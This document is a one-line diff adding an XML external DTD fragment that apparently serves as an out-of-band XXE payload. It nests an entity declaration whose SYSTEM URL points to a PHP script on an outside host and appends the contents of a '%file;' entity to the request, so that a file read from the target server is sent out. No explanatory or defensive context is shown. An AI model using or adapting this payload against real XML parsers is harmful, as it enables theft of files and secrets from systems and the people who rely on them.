@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'https://github.com/4164861/question/blob/master/1.php?file=%file;'>">
